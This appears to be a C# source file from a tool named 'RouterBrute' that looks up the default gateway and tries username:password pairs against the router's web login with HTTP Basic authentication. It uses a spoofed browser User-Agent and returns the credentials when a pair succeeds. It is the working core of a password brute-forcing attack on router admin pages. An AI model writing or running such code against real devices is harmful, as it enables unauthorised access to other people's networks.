using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Http;
using System.Windows.Forms;

namespace RouterBrute
{
    class Network
    {
        public static string GATEWAY { get { return NetworkInterface.GetAllNetworkInterfaces()[0].GetIPProperties().GatewayAddresses[1].Address.MapToIPv4().ToString(); }}
        static HttpClient http = new HttpClient();
        public static string SendLogin(string userpass)
        {
            string[] combo = userpass.Split(':');
            var auth = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("ISO-8859-1").GetBytes(combo[0] + ":" + combo[1]));
            HttpRequestMessage message = new HttpRequestMessage(new HttpMethod("GET"), "http://" + GATEWAY);
            message.Headers.Add("Host", GATEWAY);
            message.Headers.Add("Connection", "keep-alive");
            message.Headers.Add("Upgrade-Insecure-Requests", "1");
            message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36");
            message.Headers.Add("DNT", "1");
            message.Headers.Add("Accept", " text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
            message.Headers.Add("Accept-Encoding", "gzip, deflate");
            message.Headers.Add("Accept-Language", "en-US,en;q=0.9");
            message.Headers.Add("Cookie", "123456789");
            message.Headers.Add("Authorization", "Basic " + auth);
            var response = http.SendAsync(message);

            if (response.Result.StatusCode == HttpStatusCode.OK)
            {
                return Encoding.Default.GetString(Convert.FromBase64String(auth));
            }
            
            return null;
        }
    }
}
